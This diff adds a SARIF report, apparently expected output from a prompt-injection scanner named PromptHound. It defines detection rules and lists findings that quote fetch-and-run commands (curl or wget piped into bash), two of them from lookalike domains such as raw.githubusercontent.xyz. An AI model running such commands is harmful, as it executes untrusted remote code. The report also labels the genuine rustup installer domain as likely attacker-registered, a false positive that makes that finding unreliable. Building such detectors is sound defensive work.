@@ -1,0 +1,286 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Documents/CommitteeSpecifications/2.1.0/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "PromptHound",
+          "version": "0.1.0",
+          "informationUri": "https://github.com/your-org/prompthound/blob/main/README.md",
+          "rules": [
+            {
+              "id": "PH001/shell-pipe",
+              "name": "ShellPipe",
+              "shortDescription": {
+                "text": "Shell pipe-to-interpreter pattern detected (curl|bash, wget|sh, etc.)"
+              },
+              "helpUri": "https://github.com/your-org/prompthound/blob/main/README.md#ph001-shell-pipe",
+              "properties": {
+                "precision": "high"
+              }
+            },
+            {
+              "id": "PH004/suspicious-domain",
+              "name": "SuspiciousDomain",
+              "shortDescription": {
+                "text": "Suspicious or newly-registered-looking domain found in file"
+              },
+              "helpUri": "https://github.com/your-org/prompthound/blob/main/README.md#ph004-suspicious-domain",
+              "properties": {
+                "precision": "high"
+              }
+            },
+            {
+              "id": "PH100/classifier-score",
+              "name": "ClassifierScore",
+              "shortDescription": {
+                "text": "ML classifier risk score above threshold"
+              },
+              "helpUri": "https://github.com/your-org/prompthound/blob/main/README.md#ph100-classifier-score",
+              "properties": {
+                "precision": "medium"
+              }
+            },
+            {
+              "id": "PH200/capability-chain",
+              "name": "CapabilityChain",
+              "shortDescription": {
+                "text": "Dangerous capability sequence detected (e.g. read\u2192encode\u2192send)"
+              },
+              "helpUri": "https://github.com/your-org/prompthound/blob/main/README.md#ph200-capability-chain",
+              "properties": {
+                "precision": "medium"
+              }
+            }
+          ]
+        }
+      },
+      "artifacts": [
+        {
+          "location": {
+            "uri": "<TEST_FILE_PATH>"
+          },
+          "mimeType": "text/markdown"
+        }
+      ],
+      "results": [
+        {
+          "ruleId": "PH001/shell-pipe",
+          "level": "error",
+          "message": {
+            "text": "Shell pipe-to-interpreter detected at line 25: network fetcher piped directly into a shell interpreter ('curl -fsSL https://raw.githubusercontent.xyz/devtools-collective/setup/main/install.sh | bash')"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 25,
+                  "endLine": 25
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "rule-hit",
+            "internalRuleId": "SHELL_PIPE_001"
+          }
+        },
+        {
+          "ruleId": "PH001/shell-pipe",
+          "level": "error",
+          "message": {
+            "text": "Shell pipe-to-interpreter detected at line 37: network fetcher piped directly into a shell interpreter ('wget -qO- https://nodeinstall.xyz/setup_lts | bash')"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 37,
+                  "endLine": 37
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "rule-hit",
+            "internalRuleId": "SHELL_PIPE_001"
+          }
+        },
+        {
+          "ruleId": "PH001/shell-pipe",
+          "level": "error",
+          "message": {
+            "text": "Shell pipe-to-interpreter detected at line 45: network fetcher piped directly into a shell interpreter (\"curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\")"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 45,
+                  "endLine": 45
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "rule-hit",
+            "internalRuleId": "SHELL_PIPE_001"
+          }
+        },
+        {
+          "ruleId": "PH004/suspicious-domain",
+          "level": "warning",
+          "message": {
+            "text": "Non-standard TLD at line 25: 'raw.githubusercontent.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 25,
+                  "endLine": 25
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "rule-hit",
+            "internalRuleId": "SUSPICIOUS_DOMAIN_001"
+          }
+        },
+        {
+          "ruleId": "PH004/suspicious-domain",
+          "level": "warning",
+          "message": {
+            "text": "Non-standard TLD at line 37: 'nodeinstall.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 37,
+                  "endLine": 37
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "rule-hit",
+            "internalRuleId": "SUSPICIOUS_DOMAIN_001"
+          }
+        },
+        {
+          "ruleId": "PH004/suspicious-domain",
+          "level": "warning",
+          "message": {
+            "text": "Non-standard TLD at line 45: 'sh.rustup.rs' (TLD: .'rs'). Uncommon TLDs are associated with newly-registered attacker domains."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 45,
+                  "endLine": 45
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "rule-hit",
+            "internalRuleId": "SUSPICIOUS_DOMAIN_001"
+          }
+        },
+        {
+          "ruleId": "PH100/classifier-score",
+          "level": "error",
+          "message": {
+            "text": "Classifier risk score 1.0000 \u2192 label 'malicious'."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "classifier",
+            "score": 1.0,
+            "label": "malicious",
+            "decisionPath": [
+              {
+                "feature": "padding_ratio",
+                "threshold": 0.017415,
+                "direction": "<=",
+                "node_value": 0.5238
+              },
+              {
+                "feature": "[leaf]",
+                "threshold": null,
+                "direction": null,
+                "node_value": 1.0
+              }
+            ]
+          }
+        },
+        {
+          "ruleId": "PH200/capability-chain",
+          "level": "warning",
+          "message": {
+            "text": "Dangerous capability chain detected: download\u2192execute. Steps: download (line 25), execute (line 51)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "<TEST_FILE_PATH>"
+                },
+                "region": {
+                  "startLine": 25
+                }
+              }
+            }
+          ],
+          "properties": {
+            "evidenceType": "capability-chain",
+            "chainName": "download\u2192execute",
+            "steps": [
+              {
+                "capability": "download",
+                "line": 25
+              },
+              {
+                "capability": "execute",
+                "line": 51
+              }
+            ]
+          }
+        }
+      ]
+    }
+  ]
+}
